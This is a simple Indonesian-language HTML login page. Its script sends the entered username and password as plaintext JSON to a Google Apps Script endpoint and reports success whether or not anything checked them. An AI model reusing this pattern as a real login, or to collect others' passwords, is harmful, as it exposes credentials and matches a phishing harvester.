<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Login Form</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f9f9f9;
      display: flex;
      height: 100vh;
      justify-content: center;
      align-items: center;
    }
    .login-box {
      background: white;
      padding: 20px 30px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      width: 300px;
    }
    .login-box h2 {
      margin-bottom: 20px;
    }
    .login-box input {
      width: 100%;
      padding: 10px;
      margin-top: 10px;
      margin-bottom: 10px;
    }
    .login-box button {
      width: 100%;
      padding: 10px;
      background-color: #007BFF;
      border: none;
      color: white;
      cursor: pointer;
    }
    #message {
      margin-top: 15px;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <h2>Form Login</h2>
    <input type="text" id="username" placeholder="Username" required />
    <input type="password" id="password" placeholder="Password" required />
    <button onclick="submitForm()">Login</button>
    <div id="message"></div>
  </div>

  <script>
    async function submitForm() {
      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;
      const message = document.getElementById("message");

      message.style.color = "black";
      message.textContent = "Mengirim...";

      try {
        await fetch("https://script.google.com/macros/s/AKfycbzDVCLysFBZ4Z64bW6MW76UZ2gL9H5ovWZWlwaA7HGogdlOcrxNuSd-zfUsRlVhxUNV/exec", {
          method: "POST",
          mode: "no-cors", // Cegah CORS error
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({ username, password }),
        });

        message.style.color = "green";
        message.textContent = "Login berhasil (data terkirim).";

      } catch (error) {
        message.style.color = "red";
        message.textContent = "Gagal: " + error.message;
      }
    }
  </script>
</body>
</html>
